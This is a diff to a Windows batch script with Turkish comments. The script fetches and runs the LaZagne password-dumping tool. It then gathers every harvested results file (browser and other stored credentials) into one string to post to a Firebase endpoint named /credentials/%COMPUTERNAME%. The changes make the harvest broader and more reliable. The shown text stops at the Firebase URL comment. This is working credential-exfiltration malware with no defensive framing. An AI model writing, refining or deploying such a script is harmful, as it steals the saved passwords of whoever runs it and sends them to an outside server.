@@ -33,11 +33,21 @@ if %ERRORLEVEL% neq 0 (
 echo [%DATE% %TIME%] Calisma dizini: %CD% >> "%LOGFILE%"
 echo [+] Calisma dizini: %CD%
 
-:: Step 5: Eski dosyalari sil
+:: Step 5: Eski dosyalari sil veya mevcut dosyayi kontrol et
 if exist lazagne.exe (
-    echo [%DATE% %TIME%] Eski lazagne.exe siliniyor... >> "%LOGFILE%"
-    echo [+] Eski lazagne.exe siliniyor...
-    del /f /q lazagne.exe >nul 2>&1
+    echo [%DATE% %TIME%] Mevcut lazagne.exe bulundu, dosya kontrol ediliyor... >> "%LOGFILE%"
+    echo [+] Mevcut lazagne.exe bulundu, dosya kontrol ediliyor...
+    for %%F in (lazagne.exe) do (
+        if %%~zF LSS 1000 (
+            echo [%DATE% %TIME%] UYARI: lazagne.exe bozuk veya bos (%%~zF bayt), siliniyor... >> "%LOGFILE%"
+            echo [+] UYARI: lazagne.exe bozuk, siliniyor...
+            del /f /q lazagne.exe >nul 2>&1
+        ) else (
+            echo [%DATE% %TIME%] lazagne.exe gecerli, indirme atlanıyor... >> "%LOGFILE%"
+            echo [+] lazagne.exe gecerli, indirme atlanıyor...
+            goto :after_download
+        )
+    )
 )
 if exist results (
     echo [%DATE% %TIME%] Eski results klasoru siliniyor... >> "%LOGFILE%"
@@ -71,6 +81,7 @@ if %ERRORLEVEL% neq 0 (
 )
 
 :: Step 8: lazagne.exe dosyasini kontrol et
+:after_download
 if exist lazagne.exe (
     for %%F in (lazagne.exe) do (
         if %%~zF LSS 1000 (
@@ -81,8 +92,8 @@ if exist lazagne.exe (
             exit /b 1
         )
     )
-    echo [%DATE% %TIME%] lazagne.exe basariyla indirildi. >> "%LOGFILE%"
-    echo [+] lazagne.exe basariyla indirildi.
+    echo [%DATE% %TIME%] lazagne.exe basariyla indirildi veya bulundu. >> "%LOGFILE%"
+    echo [+] lazagne.exe basariyla indirildi veya bulundu.
 ) else (
     echo [%DATE% %TIME%] HATA: lazagne.exe indirilemedi! >> "%LOGFILE%"
     echo [+] HATA: lazagne.exe indirilemedi, lutfen baglantiyi kontrol edin.
@@ -102,14 +113,14 @@ if %ERRORLEVEL% neq 0 (
 )
 
 :: Step 10: Firebase’e veri gonder
-set LOGFILE=results\browsers.txt
 set DATA=
-
-if exist "%LOGFILE%" (
-    echo [%DATE% %TIME%] browsers.txt bulundu, isleniyor... >> "%LOGFILE%"
-    echo [+] browsers.txt bulundu, isleniyor...
-    setlocal EnableDelayedExpansion
-    for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
+echo [%DATE% %TIME%] Results klasorundeki veriler isleniyor... >> "%LOGFILE%"
+echo [+] Results klasorundeki veriler isleniyor...
+setlocal EnableDelayedExpansion
+for %%F in (results\*.txt) do (
+    echo [%DATE% %TIME%] %%F isleniyor... >> "%LOGFILE%"
+    echo [+] %%F isleniyor...
+    for /f "usebackq delims=" %%A in ("%%F") do (
         set "line=%%A"
         set "line=!line:\=\\!"
         set "line=!line:"=\\\"!"
@@ -120,34 +131,12 @@ if exist "%LOGFILE%" (
 =\\n!"
         set "DATA=!DATA!!line!\\n"
     )
-    endlocal & set DATA=%DATA%
-) else (
-    echo [%DATE% %TIME%] UYARI: browsers.txt bulunamadi, diger dosyalara bakiliyor... >> "%LOGFILE%"
-    echo [+] UYARI: browsers.txt bulunamadi, diger dosyalara bakiliyor...
-    :: Tum results klasorundeki txt dosyalari birlestir
-    set DATA=
-    setlocal EnableDelayedExpansion
-    for %%F in (results\*.txt) do (
-        echo [%DATE% %TIME%] %%F isleniyor... >> "%LOGFILE%"
-        echo [+] %%F isleniyor...
-        for /f "usebackq delims=" %%A in ("%%F") do (
-            set "line=%%A"
-            set "line=!line:\=\\!"
-            set "line=!line:"=\\\"!"
-            set "line=!line:^|=\\|!"
-            set "line=!line:^&=\\&!"
-            set "line=!line:^^=\\^!"
-            set "line=!line:
-=\\n!"
-            set "DATA=!DATA!!line!\\n"
-        )
-    )
-    endlocal & set DATA=%DATA%
-    if not defined DATA (
-        echo [%DATE% %TIME%] HATA: Hicbir veri dosyasi bulunamadi! >> "%LOGFILE%"
-        echo [+] HATA: Hicbir veri dosyasi bulunamadi, NoDataCollected gonderiliyor...
-        set DATA=NoDataCollected
-    )
+)
+endlocal & set DATA=%DATA%
+if not defined DATA (
+    echo [%DATE% %TIME%] HATA: Hicbir veri dosyasi bulunamadi! >> "%LOGFILE%"
+    echo [+] HATA: Hicbir veri dosyasi bulunamadi, NoDataCollected gonderiliyor...
+    set DATA=NoDataCollected
 )
 
 :: Firebase URL with /credentials/%COMPUTERNAME%
